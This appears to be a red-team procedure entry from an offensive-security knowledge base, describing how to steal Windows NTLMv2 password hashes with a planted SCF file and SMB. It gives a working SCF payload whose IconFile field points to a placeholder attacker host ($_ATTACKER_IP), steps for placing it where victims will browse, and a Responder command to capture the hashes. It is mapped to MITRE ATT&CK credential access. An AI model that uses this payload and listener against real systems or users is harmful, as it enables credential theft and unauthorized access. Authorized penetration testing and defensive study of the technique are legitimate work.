---
id: 94bc9162-0aaf-45c9-8248-ebb1c91b33c8
name: Steal an NTLMv2 Hash with an SCF File and SMB
type: procedure
verified: false
submitted: false
created_at: '2019-10-15T18:34:31.285377+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
platforms:
- Windows
tags:
- '[[Network]]'
- '[[NTLM]]'
commands:
- '[[Responder Intercept an NTLM Hash]]'
---

# Steal an NTLMv2 Hash with an SCF File and SMB

## Summary

Windows versions prior to 10 are vulnerable to NTLMv2 hash stealing using SMB and SCF files, disclosing password hashes without the user explicitly selecting the SCF file. Vulnerable versions of Windows will automatically load SCF files found in a folder, which can load files on remote systems usin

## Description

# Description

Windows versions prior to 10 are vulnerable to NTLMv2 hash stealing using SMB and SCF files, disclosing password hashes without the user explicitly selecting the SCF file. Vulnerable versions of Windows will automatically load SCF files found in a folder, which can load files on remote systems using protocols like SMB. When the system attempts to authenticate with the remote SMB, it discloses the user's NTLMv2 password hash, which can be intercepted using tools like Responder. This procedure details stealing a hash by uploading the SCF file to an SMB and waiting for a vulnerable user to browse to it, but the same  technique works by simply placing the SCF file on the target's machine.



# Instructions

1. Create the SCF file, specifying the external server using the IconFile field. The name of the file itself which IconFile points to does not matter.





**Code**: [[[Shell]
Command=2
IconFile=\\$_ATTACKER_IP\files\p]]





2. Upload the SCF file to a location that the target will browse, such as an SMB server.

3. Launch a listener to intercept the target's hash.





**Command** ([[Responder Intercept an NTLM Hash]]):

```bash
responder -I $_INTERFACE
```





## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[Responder Intercept an NTLM Hash]]

## Tags

- [[Network]]
- [[NTLM]]


